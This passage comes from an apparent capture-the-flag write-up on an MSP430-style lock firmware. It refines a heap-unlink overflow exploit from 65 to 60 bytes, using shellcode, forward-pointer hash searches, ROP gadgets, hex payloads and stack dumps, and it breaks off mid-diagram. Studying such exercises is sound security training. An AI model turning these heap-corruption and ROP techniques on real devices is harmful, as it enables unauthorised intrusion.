52a0: *                             ┌───────────────────┘ │
                                    ▼                     │
52d0: 0000 0000 0000 0000 0000 0000 7c52 3c53             │
52e0: b500 0000 0000 0000 0000 0000 0000 0000             │
52f0: 0000 0000 0000 0000 0000 0000 0000 0000             │
5300: *                             ┌─────────────────────┘
                                    ▼                      
5330: 0000 0000 0000 0000 0000 0000 dc52 0050              
5340: 7cf9 0000 0000 0000 0000 0000 0000 0000              
5350: 0000 0000 0000 0000 0000 0000 0000 0000              
5360: *                                                    
</code></pre>

<p>This behavior means the existing forward pointer (<code>0x50fc</code>) is replaceable with any of the seven others. Given eight forward pointers, each with a 1 in 8 chance to cause the hash of the exploit to be zero, the inclusive probability of success is about 0.66. The collision byte is now unnecessary, which reduces the exploit length by one byte. The search for a forward pointer that causes the exploit to hash to bucket zero can be automated as follows.</p>

<pre><code>&gt;&gt;&gt; fdlist = [&quot;fc50&quot;, &quot;5c51&quot;, &quot;bc51&quot;, &quot;1c52&quot;, &quot;7c52&quot;, &quot;dc52&quot;, &quot;3c53&quot;]
&gt;&gt;&gt; for i in fdlist:
...     overflow = b&apos;ca3d&apos; + i.encode() + b&apos;47f4&apos;
...     if hash_username(overflow) % 8 == 0:
...             print(overflow)
...
&gt;&gt;&gt;
</code></pre>

<p>Luck is unfavorable in this case, and the search yields nothing. None of the other forward pointers cause the exploit to hash to bucket zero. There is a way around this, however. Recall that this exploit redirects execution to the shellcode beginning here:</p> 

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000ca3dfc5047f4fc
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00<mark>3240</mark>01ffb01210
</code></pre>

<p>Nothing prevents returning to the word just before this.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000ca3dfc5047f4fc
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
<mark>6e00</mark>324001ffb01210
</code></pre>

<p>As long as this word is effectively a <code>NOP</code>, returning to it will cause execution to slide into the rest of the shellcode. Setting the second byte to <code>0x40</code> accomplishes this.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000ca3dfc5047f4
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
<mark>6e40</mark>324001ffb01210
</code></pre>

<p>This word disassembles to the following opcode.</p>

<pre><code>6e40      <mark>mov.b @pc, r14</mark></code></pre>

<p>After that, the size must be decremented by two to have the exploit return to an address one word earlier.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000ca3dfc50<mark>45f4</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e40324001ffb01210
</code></pre>

<p>The last step is searching for a suitable forward pointer.</p>

<pre><code>&gt;&gt;&gt; fdlist = [&quot;fc50&quot;, &quot;5c51&quot;, &quot;bc51&quot;, &quot;1c52&quot;, &quot;7c52&quot;, &quot;dc52&quot;, &quot;3c53&quot;]
&gt;&gt;&gt; for i in fdlist:
...     overflow = b&apos;ca3d&apos; + i.encode() + b&apos;45f4&apos;
...     if hash_username(overflow) % 8 == 0:
...             print(overflow)
... 
b&apos;ca3d<mark>1c52</mark>45f4&apos;
b&apos;ca3d7c5245f4&apos;
b&apos;ca3ddc5245f4&apos;
&gt;&gt;&gt; 
</code></pre>

<p>The search succeeds this time.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000ca3d<mark>1c52</mark>45f4
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e40324001ffb01210
</code></pre>

<p>This exploit successfully triggers the unlock interrupt.</p>

<pre><code>&gt;&gt;&gt; get_size(&quot;exploit.txt&quot;)
<mark>65</mark></code></pre>

<h4>Sixty-One Bytes</h4>

<p>The next question is whether the shellcode is as optimized as possible. It is practically impossible to trigger the unlock interrupt in less than four words of shellcode. The details for developing the optimized current payload are irrelevant, but suffice it to say that the last instruction must be <code>CALL 0x10</code> to allow for the omission of the eighth byte. This shellcode is as short as is realistic on this ISA.</p>

<h5>Regular Shellcode</h5>
<pre><code>3240 01ff b012 10<mark>00</mark></code></pre>

<h5>Shellcode Without Trailing Null</h5>
<pre><code>3240 01ff b012 10</code></pre>

<p>The next step is replacing this shellcode with more space-efficient ROP gadgets.</p>

<h4>Return Oriented Programming</h4>

<p>The first crucial requirement is taking control of the stack. The stack pointer must overlap a buffer filled with attacker-chosen ROP gadgets. The stack layout is as follows at the time of the unlink. The return address for <code>free</code> is at address <code>0x3dce</code>.</p>

<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 <mark>a249</mark>   .M...MtH,P.P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
3de0: 0650 6a48 f03d 0000 f63d bc4c 6e40 3240   .PjH.&#x3D;...&#x3D;.Ln@2@
3df0: 01ff b012 1000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>

<p>Recall that the implementation reads raw user input into a temporary buffer before parsing commands. This buffer, several hundred bytes long, is an ideal place to store gadgets.</p>

<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
3de0: 0650 6a48 f03d 0000 f63d bc4c <mark>6e40 3240</mark>   .PjH.&#x3D;...&#x3D;.Ln@2@
3df0: <mark>01ff b012 1000 0000 0000 0000 0000 0000</mark>   ................
3e00: <mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>   ................
3e10: *  
</code></pre>


<p>The goal is to overwrite the return address so that it returns to a gadget comprised of several <code>POP</code> instructions, which will increment the stack pointer until it overlaps the buffer containing untrusted input. The firmware will then return to a fully attacker-controlled word.</p>

<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
3de0: 0650 6a48 f03d 0000 f63d bc4c 6e40 <mark>3240</mark>   .PjH.&#x3D;...&#x3D;.Ln@2@
3df0: 01ff b012 1000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>

<p>This arrangement means the chosen gadget must pop fifteen words off the stack before returning.</p>

<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
3dd0: <mark>0800 0000 085a 0000 ff05 0650 0000 f03d</mark>   .....Z.....P...&#x3D;
3de0: <mark>0650 6a48 f03d 0000 f63d bc4c 6e40</mark> 3240   .PjH.&#x3D;...&#x3D;.Ln@2@
3df0: 01ff b012 1000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>

<p>Such an operation is unrealistic, as this MCU has sixteen registers—only twelve of which are general purpose. A search through the disassembly reveals that the most optimal gadget is only eight <code>POP</code> instructions long.</p>

<pre><code>49ba:  3441           pop       r4
49bc:  3541           pop       r5
49be:  3641           pop       r6
49c0:  3741           pop       r7
49c2:  3841           pop       r8
49c4:  3941           pop       r9
49c6:  3a41           pop       r10
49c8:  3b41           pop       r11
49ca:  3041           ret
</code></pre>

<h4>Overwriting Return Addresses In The Outer Scope</h4>

<p>The lack of suitable gadgets necessitates overwriting a different return address—ideally, one closer to the buffer containing attacker-controlled data. The return address for the <code>rehash</code> function is a viable candidate.</p>

<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
3de0: 0650 6a48 f03d 0000 f63d <mark>bc4c</mark> 6e40 3240   .PjH.&#x3D;...&#x3D;.Ln@2@
3df0: 01ff b012 1000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>

<p>There is only one word between this return address and the first fully attacker-controlled word.</p>

<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
3de0: 0650 6a48 f03d 0000 f63d <mark>bc4c</mark> 6e40 <mark>3240</mark>   .PjH.&#x3D;...&#x3D;.Ln@2@
3df0: 01ff b012 1000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>

<p>Targeting this one shortens the required sequence to only one <code>POP</code> instruction. There are a dozen such ROP gadgets available.</p>

<h5>Attempt #1:</h5>
<p>The gadget at address <code>0x4562</code> is selected arbitrarily.</p>

<pre><code>4562:  3b41           pop	r11
4564:  3041           ret
</code></pre>

<p>The target return address points to address <code>0x4cbc</code>. Calculating the correct size field proceeds as follows.</p>

<pre><code>&gt;&gt;&gt; rop_gadget_address = 0x4562
&gt;&gt;&gt; return_address = 0x4cbc
&gt;&gt;&gt; hex((rop_gadget_address-return_address-6+1) &amp; 0xffff)
&apos;<mark>0xf8a1</mark>&apos;</code></pre>

<p>Unfortunately, the search for a valid forward pointer fails with this gadget.</p>

<pre><code>&gt;&gt;&gt; fdlist = [&quot;fc50&quot;, &quot;5c51&quot;, &quot;bc51&quot;, &quot;1c52&quot;, &quot;7c52&quot;, &quot;dc52&quot;, &quot;3c53&quot;]
&gt;&gt;&gt; for i in fdlist:
...     overflow = b&apos;e63d&apos; + i.encode() + b&apos;a1f8&apos;
...     if hash_username(overflow) % 8 == 0:
...             print(overflow)
... 
&gt;&gt;&gt;</code></pre>

<h5>Attempt #2:</h5>
<p>The gadget at address <code>0x4718</code> is selected arbitrarily.</p>

<pre><code>4718:  3b41           pop       r11
471a:  3041           ret
</code></pre>

<p>Calculating the correct size field proceeds as follows.</p>

<pre><code>&gt;&gt;&gt; rop_gadget_address = 0x4718
&gt;&gt;&gt; return_address = 0x4cbc
&gt;&gt;&gt; hex((rop_gadget_address-return_address-6+1) &amp; 0xffff)
&apos;<mark>0xfa57</mark>&apos;
</code></pre>

<p>This time, the search for a valid forward pointer succeeds.</p>

<pre><code>&gt;&gt;&gt; fdlist = [&quot;fc50&quot;, &quot;5c51&quot;, &quot;bc51&quot;, &quot;1c52&quot;, &quot;7c52&quot;, &quot;dc52&quot;, &quot;3c53&quot;]
&gt;&gt;&gt; for i in fdlist:
...     overflow = b&apos;e63d&apos; + i.encode() + b&apos;57fa&apos;
...     if hash_username(overflow) % 8 == 0:
...             print(overflow)
... 
b&apos;<mark>e63d1c5257fa</mark>&apos;
b&apos;<mark>e63d7c5257fa</mark>&apos;
b&apos;<mark>e63ddc5257fa</mark>&apos;
&gt;&gt;&gt; 
</code></pre>

<p>Any of these usernames will work, so the first is selected arbitrarily.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000<mark>e63d1c5257fa</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e40324001ffb01210
</code></pre>

<p>This exploit will not work because it attempts to return to a ROP gadget and finds a word of shellcode instead, so the next step is to fix that.</p>

<h4>Size Optimized ROP Chain</h4>
<p>Consider the following dummy values.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000e63d1c5257fa
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00<mark>1111333355557777</mark>
</code></pre>

<p>An attempt to return to any of these words will result in the "<code>insn address unaligned</code>" crash on this ISA, which verifies that the exploit is working correctly. The crash happens when the processor attempts to return to address <code>0x1111</code>.</p>

<h5>Debugger Output</h5>
<pre><code>insn address unaligned
CPUOFF flag set; program no longer running. CPU must now be reset.
</code></pre>

<p>This crash indicates that an arbitrary ROP chain can be stored starting here.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000e63d1c5257fa
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00<mark>1111</mark>333355557777
</code></pre>


<p>The only concern now is writing a ROP chain that is as short as possible. Ideally, the total payload should be the minimum possible length—the same length as the command to add a single-byte username.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000e63d1c5257fa
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00<mark>??????</mark>
</code></pre>

<p>Again, the gadget at address <code>0x4718</code> will pop a word off the stack and return to the address here.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000e63d1c5257fa
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00<mark>????</mark>??
</code></pre>

<p>This constraint means the ROP chain should be only one gadget and one single-byte parameter—the payload must fit in only <em>three bytes</em>. Satisfying this requirement necessitates careful stack frame alignment.</p>

<p>Consider a regular call to the <code>INT</code> function on an earlier firmware version.</p>

<pre><code>4564:  3012 7f00      push      #0x7f
4568:  b012 b646      call      #0x46b6 &lt;INT&gt;
</code></pre>

<p>Observe what happens to stack memory.</p>

<br>
<div id="slides">
  <section id="int-call-1">
<pre><code class='language-ascii-noshadows'>                              ┌────┐      
                              │ SP │      
                              └─┬──┘      
                                │         
                                ▼         
┌────────────┐ ┌────┬────┬────┬────┐      
│   STACK    │ │0000│0000│0000│....│      
└────────────┘ └────┴────┴────┴────┘      
                                          
┌────────────┐ ┌───────────────────┐  ┌──┐
│            │ │push #0x7f         │◄─┤PC│
│INSTRUCTIONS│ ├───────────────────┤  └──┘
│            │ │call #0x46b6 &lt;INT&gt; │      
└────────────┘ └───────────────────┘      
</code></pre>
  </section>
  <section id="int-call-2">
<pre><code class='language-ascii-noshadows'>                         ┌────┐           
                         │ SP │           
                         └─┬──┘           
                           │              
                           ▼              
┌────────────┐ ┌────┬────┬────┬────┐      
│   STACK    │ │0000│0000│<mark>7f00</mark>│....│      
└────────────┘ └────┴────┴────┴────┘      
                                          
┌────────────┐ ┌───────────────────┐      
│            │ │push #0x7f         │      
│INSTRUCTIONS│ ├───────────────────┤  ┌──┐
│            │ │call #0x46b6 &lt;INT&gt; │◄─┤PC│
└────────────┘ └───────────────────┘  └──┘
</code></pre>
  </section>
  <section id="int-call-3">
<pre><code class='language-ascii-noshadows'>                    ┌────┐          
                    │ SP │          
                    └─┬──┘          
                      │             
                      ▼             
┌────────────┐ ┌────┬────┬────┬────┐
│   STACK    │ │0000│<mark>6c45</mark>│7f00│....│
└────────────┘ └────┴────┴────┴────┘
                                    
┌────────────┐ ┌───────────────────┐
│            │ │push #0x7f         │
│INSTRUCTIONS│ ├───────────────────┤
│            │ │call #0x46b6 &lt;INT&gt; │
└────────────┘ └───────────────────┘
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#int-call-1">01</a></li>
  <li><a href="#int-call-2">02</a></li>
  <li><a href="#int-call-3">03</a></li>
</ul>

<p>The calling function passes interrupt number <code>0x7F</code> to <code>INT</code>—the function that calls address <code>0x10</code>. If the exploit returns directly to <code>INT</code>, there must be a word before the interrupt number where the return address would be.</p>

<pre><code>6e00ec4c<mark>ffff</mark>7f</code></pre>

<p>This ROP payload is shorter than the shellcode but is still not the minimum length. Returning into the middle of <em>another</em> function, at the exact instruction where <em>it</em> calls <code>INT</code>, avoids the dummy return address taking up space in the ROP chain. The end of the <code>puts</code> function works nicely for this.</p>

<pre><code>4d6a:  3012 0a00      push      #0xa
4d6e:  0312           push      #0x0
<mark>4d70:  b012 ec4c      call      #0x4cec &lt;INT&gt;</mark>
4d74:  2152           add       #0x4, sp
4d76:  0f43           clr       r15
4d78:  3b41           pop       r11
4d7a:  3041           ret
</code></pre>

<p>The ROP chain is now as follows.</p>

<pre><code>6e00<mark>704d7f</mark></code></pre>

<p>The full exploit is below.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000e63d1c5257fa
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00704d7f
</code></pre>

<p>This version successfully triggers the unlock interrupt.</p>

<pre><code>&gt;&gt;&gt; get_size(&quot;exploit.txt&quot;)
<mark>61</mark></code></pre>

<h4>Sixty Bytes</h4>

<p>The executing firmware adds the corrupted size field to the return address and returns to a ROP gadget comprised of a single <code>POP</code> instruction. Considering that there are a dozen such gadgets, one may be within 256 bytes of the return location—meaning it may be possible to redirect execution to a <code>POP</code> gadget with only a single byte overflow in the size field.</p>

<p>The rehash function returns here.</p>

<pre><code><mark>4cbc:  0e3c           jmp       $+0x1e &lt;run+0x174&gt;</mark>
4cbe:  3f40 544b      mov       #0x4b54, r15
4cc2:  b012 504d      call      #0x4d50 &lt;puts&gt;
4cc6:  1f43           mov       #0x1, r15
4cc8:  3150 0006      add       #0x600, sp
4ccc:  3741           pop       r7
4cce:  3841           pop       r8
4cd0:  3941           pop       r9
4cd2:  3a41           pop       r10
4cd4:  3b41           pop       r11
4cd6:  3041           ret
</code></pre>

<p>This location is very close to the end of the function, and there is a <code>POP</code> instruction just before the return instruction—at address <code>0x4cd4</code>.</p>

<pre><code>4cbc:  0e3c           jmp       $+0x1e &lt;run+0x174&gt;
4cbe:  3f40 544b      mov       #0x4b54, r15
4cc2:  b012 504d      call      #0x4d50 &lt;puts&gt;
4cc6:  1f43           mov       #0x1, r15
4cc8:  3150 0006      add       #0x600, sp
4ccc:  3741           pop       r7
4cce:  3841           pop       r8
4cd0:  3941           pop       r9
4cd2:  3a41           pop       r10
<mark>4cd4:  3b41           pop       r11</mark>
4cd6:  3041           ret
</code></pre>

<p>The size field calculation is below.</p>

<pre><code>&gt;&gt;&gt; rop_gadget_address = 0x4cd4
&gt;&gt;&gt; return_address = 0x4cbc
&gt;&gt;&gt; hex((rop_gadget_address-return_address-6+1) &amp; 0xffff)
&apos;<mark>0x13</mark>&apos;
</code></pre>

<p>This value meets the length criteria, so the remaining question is whether a suitable forward pointer is available.</p>

<pre><code>&gt;&gt;&gt; fdlist = [&quot;fc50&quot;, &quot;5c51&quot;, &quot;bc51&quot;, &quot;1c52&quot;, &quot;7c52&quot;, &quot;dc52&quot;, &quot;3c53&quot;]
&gt;&gt;&gt; for i in fdlist:
...     overflow = b&apos;e63d&apos; + i.encode() + b&apos;13&apos;
...     if hash_username(overflow) % 8 == 0:
...             print(overflow)
... 
b&apos;<mark>e63dfc5013</mark>&apos;
&gt;&gt;&gt;</code></pre>

<p>The revised exploit is now as follows.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000<mark>e63dfc5013</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00704d7f
</code></pre>

<h4>Instruction Unaligned Crash</h4>

<p>Unfortunately, this exploit results in an unusual crash.</p>

<pre><code>insn address unaligned
CPUOFF flag set; program no longer running. CPU must now be reset.
</code></pre>

<h4>Debugging</h4>

<p>Observe what happens to stack memory after each call to the <code>free</code> function. The overwritten return address will be here.</p>

<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
3de0: 0650 6a48 f03d 0000 f23d <mark>bc4c</mark> 6e00 704d   .PjH.&#x3D;...&#x3D;.Ln.pM
3df0: 7f00 0000 0000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>

<p>Single-stepping reveals that the arbitrary write completes successfully. The stack is as follows after freeing the corrupted chunk.</p>

<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
3de0: 0650 6a48 f03d 0000 fc50 <mark>d44c</mark> 6e00 704d   .PjH.&#x3D;...P.Ln.pM
3df0: 7f00 0000 0000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>

<p>This behavior is as expected. The problem arises during the subsequent <code>free</code> calls.</p>

<br>

<div id="slides">
  <section id="fake-chunk-corruption-2">
<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
3de0: 0650 6a48 f03d 0000 <mark>5c51 8e4d</mark> 6e00 704d   .PjH.&#x3D;..\Q.Mn.pM
3df0: 7f00 0000 0000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>
  </section>
  <section id="fake-chunk-corruption-3">

<pre><code>3dc0: 004d 0100 124d 7448 3250 1c50 0650 a249   .M...MtH2P.P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
3de0: 0650 6a48 f03d 0000 <mark>bc51 484e</mark> 6e00 704d   .PjH.&#x3D;...QHNn.pM
3df0: 7f00 0000 0000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>
  </section>
  <section id="fake-chunk-corruption-4">
<pre><code>3dc0: 004d 0100 124d 7448 3450 1e50 0650 a249   .M...MtH4P.P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...=
3de0: 0650 6a48 f03d 0000 <mark>1c52 024f</mark> 6e00 704d   .PjH.=...R.On.pM
3df0: 7f00 0000 0000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>
  </section>
  <section id="fake-chunk-corruption-5">
<pre><code>3dc0: 004d 0100 124d 7448 3650 2050 0650 a249   .M...MtH6P P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...=
3de0: 0650 6a48 f03d 0000 <mark>7c52 bc4f</mark> 6e00 704d   .PjH.=..|R.On.pM
3df0: 7f00 0000 0000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>
  </section>
  <section id="fake-chunk-corruption-6">
<pre><code>3dc0: 004d 0100 124d 7448 3850 2250 0650 a249   .M...MtH8P"P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...=
3de0: 0650 6a48 f03d 0000 <mark>dc52 7650</mark> 6e00 704d   .PjH.=...RvPn.pM
3df0: 7f00 0000 0000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>
  </section>
  <section id="fake-chunk-corruption-7">
<pre><code>3dc0: 004d 0100 124d 7448 3850 2250 0650 a249   .M...MtH8P&quot;P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
3de0: 0650 6a48 f03d 0000 <mark>3c53 3051</mark> 6e00 704d   .PjH.&#x3D;..&lt;S0Qn.pM
3df0: 7f00 0000 0000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *  
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#fake-chunk-corruption-2">Call 2</a></li>
  <li><a href="#fake-chunk-corruption-3">Call 3</a></li>
  <li><a href="#fake-chunk-corruption-4">Call 4</a></li>
  <li><a href="#fake-chunk-corruption-5">Call 5</a></li>
  <li><a href="#fake-chunk-corruption-6">Call 6</a></li>
  <li><a href="#fake-chunk-corruption-7">Call 7</a></li>
</ul>

<p>Recall that performing the write requires the implementation to interpret three words on the stack as being part of a heap chunk. In this case, the forward pointer and size of that "chunk" are updated by every <code>free</code> call after the initial write occurs. This bug is unique to this particular exploit—it does not affect the previous ones.</p>

<h4>Regression Testing</h4>

<p>Think about what is required for this behavior to occur. The <code>free</code> function must be called multiple times, so this issue must be a byproduct of the choice to change the target return address to one in the outer scope. Previous exploits overwrote the return address for the first <code>free</code> call, so execution never reached the others. Changing the target return address was necessary to switch from shellcode to ROP gadgets, so the 61-byte exploit must have introduced this issue.</p>

<h4>Differential Analysis</h4>

<p>After comparing the two, it becomes apparent that the 61-byte exploit does not have this problem.</p>

<pre><code>3dc0: 004d 0100 124d 7448 2c50 1650 0650 a249   .M...MtH,P.P.P.I
3dd0: 0800 0000 085a 0000 ff05 0650 0000 f03d   .....Z.....P...&#x3D;
3de0: 0650 6a48 f03d 0000 <mark>1c52 1847</mark> 6e00 704d   .PjH.&#x3D;...R.Gn.pM
3df0: 7f00 0000 0000 0000 0000 0000 0000 0000   ................
3e00: 0000 0000 0000 0000 0000 0000 0000 0000   ................
3e10: *
</code></pre>

<p>With that exploit, subsequent calls to <code>free</code> do not update the above two words. There must be some difference between these two exploits to result in this behavior. The back pointer and ROP gadgets have not changed, so the only difference between the two is the forward pointer and the size.</p>

<h5>Length: 61 bytes</h5>
<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000e63d<mark>1c5257fa</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00704d7f
</code></pre>

<h5>Length: 60 bytes</h5>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000e63d<mark>fc5013</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00704d7f
</code></pre>

<p>There are two reasonable hypotheses:</p>

<ol>
	<li>Something is wrong with the size (i.e., there may be a minimum).</li>
	<li>Something is wrong with the forward pointer.</li>
</ol>

<p>The behavior of the size field is very well understood from previous analysis done on Algiers, so the culprit must be the forward pointer. Observe what happens during the normal execution of the algorithm.</p>

<br>
<div id="slides">
  <section id="normal-free-call-1">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ <mark>FREE CALL #1</mark> │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘
                              
  ┌────────┬────────┬────────┐
  │  ....  │  ....  │  ....  │
  └────────┴─────┬──┴────────┘
     ▲           │            
┌────┘           │            
│                │            
│    ┌───────────┘            
│    ▼                        
│ ┌────────┬────────┬────────┐
└─┤  5026  │  509c  │  00b5  │
  └────────┴─────┬──┴────────┘
     ▲           │            
┌────┘           │            
│                │            
│    ┌───────────┘            
│    ▼                        
│ ┌────────┬────────┬────────┐
└─┤  503c  │  50fc  │  00b5  │
  └────────┴─────┬──┴────────┘
     ▲           │            
┌────┘           │            
│                │            
│    ┌───────────┘            
│    ▼                        
│ ┌────────┬────────┬────────┐
└─┤  509c  │  515c  │  00b5  │
  └────────┴─────┬──┴────────┘
     ▲           │            
┌────┘           │            
│                │            
│    ┌───────────┘            
│    ▼                        
│ ┌────────┬────────┬────────┐
└─┤  50fc  │  51bc  │  00b5  │
  └────────┴─────┬──┴────────┘
     ▲           │            
┌────┘           │            
│                │            
│    ┌───────────┘            
│    ▼                        
│ ┌────────┬────────┬────────┐
└─┤  ....  │  ....  │  ....  │
  └────────┴────────┴────────┘
</code></pre>
  </section>
  <section id="normal-free-call-2">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ FREE CALL #1 │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐  ┌────────────────┐
└─┤  5026  │  509c  │  <mark>00b4</mark>  │◄─┤UNSET IN-USE BIT│
  └────────┴─────┬──┴────────┘  └────────────────┘
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  503c  │  50fc  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  509c  │  515c  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  50fc  │  51bc  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  ....  │  ....  │  ....  │                    
  └────────┴────────┴────────┘                    
</code></pre>
  </section>
  <section id="normal-free-call-3">
<pre><code class='language-ascii-noshadows'>  ┌──────────────────────────┐    ┌──────────────┐
  │           HEAP           │    │              │
  ├────────┬────────┬────────┤    │ <mark>FREE CALL #2</mark> │
  │   BK   │   FD   │  SIZE  │    │              │
  └────────┴────────┴────────┘    └──────────────┘
                                                  
  ┌────────┬────────┬────────┐                    
  │  ....  │  ....  │  ....  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐
└─┤  5026  │  509c  │  00b4  │
  └────────┴─────┬──┴────────┘
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
│    ▼                                            
│ ┌────────┬────────┬────────┐                    
└─┤  503c  │  50fc  │  00b5  │                    
  └────────┴─────┬──┴────────┘                    
     ▲           │                                
┌────┘           │                                
│                │                                
│    ┌───────────┘                                
